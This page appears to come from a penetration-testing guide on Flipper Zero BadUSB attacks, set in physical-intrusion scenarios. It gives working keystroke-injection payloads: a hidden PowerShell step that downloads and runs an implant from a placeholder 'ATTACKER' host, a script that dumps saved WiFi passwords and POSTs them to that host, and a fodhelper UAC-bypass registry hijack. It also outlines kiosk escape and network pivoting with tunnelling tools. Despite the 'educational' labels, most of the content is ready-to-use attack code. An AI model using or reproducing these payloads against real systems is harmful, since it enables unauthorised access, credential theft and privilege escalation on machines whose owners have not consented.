## Penetration Testing Scenarios

### Scenario 1 - Drop Attack during Physical Pentest

**Objective:** obtain remote access to a corporate PC

**Preparation:**
1. Write a payload that installs a persistent reverse shell
2. Set up a C2 server (e.g. Sliver, Cobalt Strike, Havoc)
3. Generate the PowerShell payload for the C2
4. Create the BadUSB script that downloads and executes the payload
5. Test on a PC with the same OS and configuration as the target

**Execution:**
1. During the physical pentest, access the office area
2. Identify an unlocked and unattended PC (break, meeting, restroom)
3. Connect the Flipper via USB
4. Launch the payload -> execution in 5-10 seconds
5. Disconnect the Flipper and walk away
6. Verify the C2 connection from your external setup

**Example payload (PowerShell reverse shell - educational):**
```
REM Reverse Shell Windows - Educational PoC
REM Layout: IT
DEFAULT_DELAY 100

REM Open minimized PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

REM Download and execute the C2 payload
STRING $c=New-Object Net.WebClient;$c.DownloadFile('http://ATTACKER/implant.exe','C:\Users\Public\svc.exe');Start-Process 'C:\Users\Public\svc.exe'
ENTER
DELAY 500

REM Close the window
STRING exit
ENTER
```

### Scenario 2 - WiFi Credential Exfiltration

**Objective:** extract all saved WiFi passwords from a target PC

**Payload:**
```
REM WiFi Password Exfiltration - Educational PoC
DEFAULT_DELAY 100

GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $r='';(netsh wlan show profiles)|Select-String 'Profilo\s+:(.+)' -AllMatches|%{$n=$_.Matches.Groups[1].Value.Trim();$k=((netsh wlan show profile name=$n key=clear)|Select-String 'Contenuto\s+:(.+)');if($k){$r+="$n : $($k.Matches.Groups[1].Value.Trim())`n"}};$r|Out-File $env:TEMP\w.txt
ENTER
DELAY 2000

REM Send to server (or save on Flipper via mass storage)
STRING Invoke-WebRequest -Uri http://ATTACKER/collect -Method POST -Body (Get-Content $env:TEMP\w.txt -Raw)
ENTER
STRING del $env:TEMP\w.txt
ENTER
STRING exit
ENTER
```

### Scenario 3 - Privilege Escalation via BadUSB

**Objective:** from standard user to local admin

**Technique 1 - UAC Bypass (if user is in Administrators but UAC is active):**
```
REM UAC Bypass via fodhelper
DEFAULT_DELAY 100
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
ENTER
DELAY 200
STRING Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd /c start powershell" -Force
ENTER
DELAY 200
STRING Start-Process fodhelper.exe
ENTER
```

**Technique 2 - If not in Administrators:**
- Exploit known CVEs for the target kernel/OS
- Search for admin credentials in local files, registries, scripts
- Attempt service exploits (if available)

### Scenario 4 - Kiosk Escape + Network Pivot

**Objective:** gain access to the internal network from a kiosk terminal

1. Use the Kiosk Evasion payload to escape kiosk mode
2. Once desktop/shell access is obtained:
   - Identify the network configuration (ipconfig, ifconfig)
   - Download pivot tools (chisel, ligolo)
   - Establish a tunnel to the outside
3. From there, pivot into the internal network for further attacks

---

## Cross-Reference - Multi-Vector Scenarios

| Scenario | Related Module | Link | How they connect |
|----------|---------------|------|------------------|
| Drop attack + NFC | NFC | [05-Scenari-Reali](../NFC/05-Scenari-Reali.md) | Cloned NFC badge for physical access -> drop BadUSB on workstation |
| Drop attack + RFID | RFID | [05-Scenari-Reali](../RFID/05-Scenari-Reali.md) | RFID badge for access -> BadUSB payload on office PC |
| Kiosk escape + WiFi | WiFi-Marauder | [05-Scenari-Reali](../WiFi-Marauder/05-Scenari-Reali.md) | BadUSB escape from kiosk -> ESP32 for WiFi recon/pivot |
| Exfiltration + BLE | Bluetooth | [05-Scenari-Reali](../Bluetooth/05-Scenari-Reali.md) | BadUSB collects data -> exfiltration via BLE to Flipper (no network) |
| Drop + Sub-GHz | Sub-GHz | [05-Scenari-Reali](../Sub-GHz/05-Scenari-Reali.md) | Sub-GHz for perimeter access -> BadUSB inside |
| Drop + NRF24 | GPIO/NRF24 | [04-Scenari-Reali](../GPIO/NRF24/04-Scenari-Reali.md) | MouseJacker as wireless alternative to wired BadUSB |
